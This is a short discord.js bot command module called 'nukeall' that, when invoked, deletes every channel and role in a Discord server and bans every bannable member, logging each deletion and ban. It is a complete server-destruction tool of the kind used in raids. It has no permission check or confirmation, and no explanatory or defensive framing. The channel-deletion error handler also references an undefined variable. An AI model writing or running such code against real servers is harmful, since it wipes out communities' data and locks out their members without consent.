const Discord = module.require("discord.js");
module.exports.run = async (bot, messages, args) => {

       await messages.guild.channels.forEach(c => {
        c.delete()
        .then(() => console.log(`deleted channel ${c.name} ID:${c.id}`))
        .catch(() => console.error(`unable to delete ${c.name} ID:${r.id}`));
 });
       await messages.guild.roles.forEach(r => {
        r.delete()
        .then(() => console.log(`deleted role ${r.name} ID:${r.id}`))
        .catch(() => console.error(`unable to delete role ${r.name} ID: ${r.id} not high enough role.`));
 });
       await messages.guild.members.filter(m => m.bannable).forEach(m => {
        m.ban();
        if (m.user.bot) {
        console.log(`Banned Bot ${m.user.username} ID:${m.id}`)
        }
        else {
        console.log(`Banned Member ${m.user.username}; ID: ${m.id}`);
 }
 });
 }
module.exports.help = {
  name: "nukeall",
  desc: "all functions in one"
}
